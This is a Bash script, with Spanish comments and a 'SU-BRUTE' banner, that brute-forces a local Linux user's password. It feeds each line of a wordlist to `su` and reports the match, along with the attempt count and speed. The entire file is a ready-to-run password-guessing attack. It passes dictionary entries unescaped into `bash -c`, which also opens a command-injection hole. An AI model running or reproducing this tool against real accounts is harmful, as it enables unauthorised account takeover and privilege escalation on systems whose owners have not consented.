#!/bin/bash

# Variables globales
verbose=false
delay=0.1
total_passwords=0
current_attempt=0

# Colores ANSI
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
BLUE='\e[1;34m'
PURPLE='\e[1;35m'
CYAN='\e[1;36m'
WHITE='\e[1;37m'
GRAY='\e[0;37m'
RESET='\e[0m'

# Función que se ejecutará en caso de que el usuario no proporcione argumentos correctos
mostrar_ayuda() {
    echo -e "Uso: $0 [OPCIONES] USUARIO DICCIONARIO"
    echo
    echo -e "Opciones:"
    echo -e "  -v, --verbose    Modo verbose (mostrar detalles)"
    echo -e "  -d, --delay      Delay entre intentos (default: 0.1)"
    echo -e "  -h, --help       Mostrar esta ayuda"
    exit 1
}

# Banner mejorado con animación
imprimir_banner() {
    clear
    echo -e "${BLUE}"
    echo "╔═════════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                             ║"
    echo "║      ███████╗██╗   ██╗      ██████╗ ██████╗ ██╗   ██╗████████╗███████╗      ║"
    echo "║      ██╔════╝██║   ██║      ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝      ║"
    echo "║      ███████╗██║   ██║█████╗██████╔╝██████╔╝██║   ██║   ██║   █████╗        ║"
    echo "║      ╚════██║██║   ██║╚════╝██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝        ║"
    echo "║      ███████║╚██████╔╝      ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗      ║"
    echo "║      ╚══════╝ ╚═════╝       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝      ║"
    echo "║                                                                             ║"
    echo "╚═════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo
}

# Función para mostrar progreso
mostrar_progreso() {
    local progreso=$((current_attempt * 100 / total_passwords))
    local barra_llena=$((progreso / 2))
    local barra_vacia=$((50 - barra_llena))
    
    # Imprimir inicio de la barra
    printf "\r${PURPLE}[${RESET}"
    # Parte llena
    printf '█%.0s' $(seq 1 $barra_llena)
    # Parte vacía
    printf '░%.0s' $(seq 1 $barra_vacia)
    # Cierre de la barra + porcentaje y conteo
    printf "${PURPLE}]${RESET} ${WHITE}%3d%%${RESET} ${GRAY}[%d/%d]${RESET}" \
        $progreso $current_attempt $total_passwords
}

# Función para contar líneas del diccionario
contar_passwords() {
    echo -e "${PURPLE}[${RESET}${WHITE}INFO${RESET}${PURPLE}]${RESET} ${CYAN}Analizando diccionario...${RESET}"
    total_passwords=$(wc -l < "$diccionario" 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo -e "${PURPLE}[${RESET}${WHITE}INFO${RESET}${PURPLE}]${RESET} ${WHITE}Total de contraseñas a probar: ${GREEN}$total_passwords${RESET}"
    else
        echo -e "${RED}[ERROR] No se pudo leer el archivo de diccionario${RESET}"
        exit 1
    fi
    echo
}


# Función para mostrar información del sistema
mostrar_info_sistema() {
        echo -e "${PURPLE}"
        echo -e "╔══════════════════════════════════════════════════════════╗"
        echo -e "                  ${WHITE}INFORMACIÓN DEL ATAQUE${PURPLE}"
        echo -e "╠══════════════════════════════════════════════════════════╣"
        echo -e "  ${WHITE}Usuario objetivo: ${GREEN}$usuario"
        echo -e "  ${WHITE}Diccionario:      ${YELLOW}$(basename "$diccionario")"
    if $verbose; then
        echo -e "  ${WHITE}Modo verbose:     ${GREEN}Activado"
    else
        echo -e "  ${WHITE}Modo verbose:     ${RED}Desactivado"
    fi
        echo -e "  ${WHITE}Delay:            ${CYAN}${delay}s"
        echo -e "  ${WHITE}Fecha/Hora:       ${GRAY}$(date '+%Y-%m-%d %H:%M:%S')${PURPLE}"
        echo -e "╚══════════════════════════════════════════════════════════╝"
        echo
}

# Llamamos a esta función desde el trap finalizar SIGINT
finalizar() {
    echo
    echo -e "${RED}"
    echo -e "╔════════════════════════════════════════╗${RESET}"
    echo -e "            ${WHITE}ATAQUE INTERRUMPIDO${RED}"
    echo -e "╠════════════════════════════════════════╣${RESET}"
    echo -e "   ${WHITE}Intentos realizados: ${YELLOW}$current_attempt${RESET}/${GRAY}$total_passwords${RED}"
    echo -e "   ${WHITE}Estado: ${RED}Cancelado por el usuario${RED}"
    echo -e "╚════════════════════════════════════════╝"
    exit 130
}

trap finalizar SIGINT

# Parsear argumentos
while [[ $# -gt 0 ]]; do
    case $1 in
        -v|--verbose)
            verbose=true
            shift
            ;;
        -d|--delay)
            delay="$2"
            shift 2
            ;;
        -h|--help)
            mostrar_ayuda
            ;;
        -*)
            echo -e "${RED}[ERROR] Opción desconocida: $1${RESET}"
            mostrar_ayuda
            ;;
        *)
            if [ -z "$usuario" ]; then
                usuario="$1"
            elif [ -z "$diccionario" ]; then
                diccionario="$1"
            else
                echo -e "${RED}[ERROR] Demasiados argumentos${RESET}"
                mostrar_ayuda
            fi
            shift
            ;;
    esac
done

# Verificar que se proporcionaron los argumentos necesarios
if [ -z "$usuario" ] || [ -z "$diccionario" ]; then
    mostrar_ayuda
fi

# Verificar que el diccionario existe
if [ ! -f "$diccionario" ]; then
    echo -e "${RED}[ERROR] El archivo de diccionario '$diccionario' no existe${RESET}"
    exit 1
fi

# Verificar que el usuario existe en el sistema
if ! id "$usuario" &>/dev/null; then
    echo -e "${RED}[ERROR] El usuario '$usuario' no existe en el sistema${RESET}"
    exit 1
fi

# Mostrar banner y información
imprimir_banner
contar_passwords
mostrar_info_sistema

# Iniciar el ataque
echo -e "${GREEN}"
echo -e "╔════════════════════════════════════════╗"
echo -e "           ${WHITE}INICIANDO ATAQUE${GREEN}"
echo -e "╚════════════════════════════════════════╝"
echo

start_time=$(date +%s)

# Bucle principal
while IFS= read -r password; do
    ((current_attempt++))
    
    if $verbose; then
        echo -e "${CYAN}[${current_attempt}/${total_passwords}]${RESET} ${WHITE}Probando:${RESET} ${YELLOW}'$password'${RESET}"
    else
        mostrar_progreso
    fi
    
    # Intentar la contraseña
    if timeout $delay bash -c "echo '$password' | su $usuario -c 'echo Hello'" > /dev/null 2>&1; then
        end_time=$(date +%s)
        duration=$((end_time - start_time))
        
        # Evitar división por cero
        if [ $duration -eq 0 ]; then
            duration=1
        fi
        
        clear
        echo -e "${GREEN}"
        echo -e "╔══════════════════════════════════════════════════════════╗"
        echo -e "              ${WHITE}¡CONTRASEÑA ENCONTRADA!${GREEN}"
        echo -e "╠══════════════════════════════════════════════════════════╣"
        echo -e "   ${WHITE}Usuario:          ${YELLOW}$usuario${GREEN}"
        echo -e "   ${WHITE}Contraseña:       ${RED}$password${GREEN}"
        echo -e "   ${WHITE}Intentos:         ${CYAN}$current_attempt${RESET}/${GRAY}$total_passwords${GREEN}"
        echo -e "   ${WHITE}Tiempo:           ${PURPLE}${duration}s${GREEN}"
        echo -e "   ${WHITE}Velocidad:        ${CYAN}$((current_attempt / duration))${RESET} intentos/s${GREEN}"
        echo -e "╚══════════════════════════════════════════════════════════╝"

        echo        
        exit 0
    fi
    
    sleep $delay
    
done < "$diccionario"

# Si llegamos aquí, no se encontró la contraseña
end_time=$(date +%s)
duration=$((end_time - start_time))

# Evitar división por cero
if [ $duration -eq 0 ]; then
    duration=1
fi

echo
echo -e "${RED}"
echo -e "╔══════════════════════════════════════════════════════════╗"
echo -e "                  ${WHITE}CONTRASEÑA NO ENCONTRADA${RED}"
echo -e "╠══════════════════════════════════════════════════════════╣"
echo -e "   ${WHITE}Usuario:          ${YELLOW}$usuario${RED}"
echo -e "   ${WHITE}Intentos:         ${CYAN}$current_attempt${RESET}/${GRAY}$total_passwords{RED}"
echo -e "   ${WHITE}Tiempo total:     ${PURPLE}${duration}s${RED}"
echo -e "   ${WHITE}Velocidad:        ${CYAN}$((current_attempt / duration))${RESET} intentos/s${RED}"
echo -e "╚══════════════════════════════════════════════════════════╝"